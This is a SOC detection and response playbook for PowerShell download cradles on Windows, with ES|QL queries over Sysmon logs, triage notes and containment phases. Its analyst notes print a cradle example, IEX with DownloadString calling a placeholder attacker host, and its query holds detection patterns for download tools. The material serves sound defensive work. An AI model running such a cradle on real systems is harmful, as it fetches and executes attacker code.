Playbook.name: Windows — Remote File Download via PowerShell - SOC Playbook

Metadata.Category: Command and Control / Ingress Tool Transfer

ExecutiveSummary.Overview: PowerShell made a DNS lookup to a non-Microsoft domain and then downloaded a file within 30s - the download-cradle pattern used to fetch second-stage payloads. Triage question: is PowerShell fetching an attacker payload, or a legitimate script downloading a resource?
ExecutiveSummary.BusinessImpact: PowerShell download cradles (IEX DownloadString/DownloadFile) fetch and often directly execute attacker code.

TelemetryRequirements.Requirement: Windows Security + Sysmon + PowerShell logs via Elastic Agent (verified live). Sysmon event.code 1=process(command_line/parent populated), 11=file, 13/12=registry(registry.path populated); process.code_signature NOT collected.

Signal.Name: PowerShell download
Signal.Details: PowerShell DNS to a non-Microsoft domain then a download within 30s.

InitialAssessment.Rule: Weigh the evidence story, not any single fact - see ClassificationGuidance.

Investigation.Goal: Determine whether the PowerShell download fetched an attacker payload or a legitimate resource.

Step.name: PowerShell download command and destination domain
Step.Purpose: The command and target domain reveal a download cradle vs a legitimate fetch.
Step.Query: FROM logs-windows.sysmon_operational-*,logs-system.security-* | WHERE event.code IN ("1","4688") AND host.name == "$hostname" AND process.name RLIKE "(?i)(powershell|pwsh|powershell_ise).*" AND process.command_line IS NOT NULL AND @timestamp >= NOW() - 4 hours | EVAL cl = TO_LOWER(process.command_line) | WHERE cl LIKE "*downloadstring*" OR cl LIKE "*downloadfile*" OR cl LIKE "*invoke-webrequest*" OR cl LIKE "*iwr *" OR cl LIKE "*wget *" OR cl LIKE "*curl *" OR cl LIKE "*.downloaddata*" | KEEP @timestamp, process.parent.name, process.command_line, user.name | SORT @timestamp DESC | LIMIT 15
Step.AnalystNotes: IEX (New-Object Net.WebClient).DownloadString('http://<attacker>') is a classic cradle. A raw IP/paste-site/unusual domain fetching code is malicious; an internal/vendor URL for a resource is likely benign. The IEX + download combination (execute-what-you-fetch) is the strongest signal.

Step.name: Did a new process/connection follow the download
Step.Purpose: A new process or external connection right after the download indicates the payload ran.
Step.Query: FROM logs-windows.sysmon_operational-* | WHERE event.code == "3" AND host.name == "$hostname" AND @timestamp >= NOW() - 1 hours | STATS conns = COUNT(*), dests = COUNT_DISTINCT(destination.ip), dest_ports = VALUES(destination.port) BY process.name | SORT conns DESC | LIMIT 15
Step.AnalystNotes: New outbound connections from PowerShell or a spawned process after the download support payload execution/C2 - escalate.

Node.Condition: A PowerShell download cradle (IEX + DownloadString) from a suspicious domain/IP, especially with follow-on execution/connections.
A legitimate script downloading a resource from an internal/vendor URL.
PowerShell download with an unclear destination.

DocumentationChecklist.Item: Attach outputs of INV-01-PSDL-CMD, INV-02-PSDL-FOLLOWON to the case.

SOCAction.Item: Verify the source; close as false_positive.

TruePositive.Definition: A PowerShell download cradle fetching attacker code.

SOCAction.Item: Isolate the host; capture the fetched payload; open IR.
Block the domain/IP; hunt the same cradle estate-wide.

Misconfiguration.Definition: A deployment script using PowerShell downloads by design.

Phase.name: Immediate Actions (0-30 minutes)
Phase.Action: Confirm the activity on the host; if malicious indicators, isolate the host.
Identify the responsible account/process and its origin.

Phase.name: Containment and Eradication (hours)
Phase.Action: Isolate the host; capture volatile evidence; hunt the same pattern across the estate.
Reset credentials used on the host if compromise is confirmed.

Phase.name: Recovery and Hardening (days)
Phase.Action: Remediate the root cause; add/verify EDR coverage; apply relevant hardening.

QualityChecks.Check: Confirm the required telemetry (Sysmon/Security auditing) is present on the host.
Tune known-benign administrative sources via exceptions, not by disabling the rule.

TruePositiveClosure.Item: Host contained and triaged; root cause eradicated; estate swept; findings recorded.
